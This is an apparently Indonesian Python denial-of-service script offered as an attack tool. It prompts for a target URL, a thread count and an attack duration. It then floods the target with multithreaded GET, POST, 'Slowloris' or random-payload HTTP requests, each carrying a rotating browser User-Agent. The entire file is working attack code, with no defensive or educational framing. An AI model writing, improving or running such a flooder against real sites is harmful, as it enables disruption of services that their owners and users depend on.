import requests
import threading
import random
import time
import string
from colorama import Fore, Style, init

init(autoreset=True)

dummy_data = {"key": "value"}

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
]

def send_get_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(url, headers=headers, timeout=5)
            print(Fore.GREEN + f"[ Thread-{thread_id} ] GET berhasil ke {url}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] GET gagal: {e}")

def send_post_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.post(url, data=dummy_data, headers=headers, timeout=5)
            print(Fore.GREEN + f"[ Thread-{thread_id} ] POST berhasil ke {url}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] POST gagal: {e}")

def send_slowloris_request(url, thread_id):
    try:
        headers = {"User-Agent": random.choice(user_agents), "Connection": "keep-alive"}
        while True:
            response = requests.get(url, headers=headers, stream=True, timeout=5)
            print(Fore.YELLOW + f"[ Thread-{thread_id} ] Slowloris koneksi aktif ke {url}")
            time.sleep(10)
    except Exception as e:
        print(Fore.RED + f"[ Thread-{thread_id} ] Slowloris gagal: {e}")

def send_http_flood_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
            response = requests.post(url, data={"data": payload}, headers=headers, timeout=5)
            print(Fore.GREEN + f"[ Thread-{thread_id} ] HTTP Flood berhasil ke {url}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] HTTP Flood gagal: {e}")

def main():
    print(Fore.GREEN + """
\033[1;31m1. \033[1;36mGET
\033[1;31m2. \033[1;36mPOST
\033[1;31m3. \033[1;36mSlowloris
\033[1;31m4. \033[1;36mHTTP Flood
""")
    method = input(Fore.CYAN + "Pilih metode serangan (1-4):\033[1;37m ").strip()
    url = input(Fore.CYAN + "Masukkan URL target:\033[1;37m ").strip()
    threads = int(input(Fore.CYAN + "Masukkan jumlah thread:\033[1;37m "))
    duration = int(input(Fore.CYAN + "Masukkan durasi serangan (detik):\033[1;37m "))

    print(Fore.GREEN + f"[ INFO ] Memulai serangan ke {url} dengan {threads} thread selama {duration} detik...")
    time.sleep(1)

    stop_time = time.time() + duration

    def attack_wrapper(func):
        for thread_id in range(1, threads + 1):
            thread = threading.Thread(target=func, args=(url, thread_id))
            thread.daemon = True
            thread.start()

    if method == "1":
        print(Fore.GREEN + "[ INFO ] Serangan GET dimulai!")
        attack_wrapper(send_get_request)
    elif method == "2":
        print(Fore.GREEN + "[ INFO ] Serangan POST dimulai!")
        attack_wrapper(send_post_request)
    elif method == "3":
        print(Fore.GREEN + "[ INFO ] Serangan Slowloris dimulai!")
        attack_wrapper(send_slowloris_request)
    elif method == "4":
        print(Fore.GREEN + "[ INFO ] Serangan HTTP Flood dimulai!")
        attack_wrapper(send_http_flood_request)
    else:
        print(Fore.RED + "[ ERROR ] Pilihan metode tidak valid. Silakan pilih antara 1-4.")
        return

    while time.time() < stop_time:
        time.sleep(1)

    print(Fore.YELLOW + "[ INFO ] Serangan selesai.")

if __name__ == "__main__":
    main()
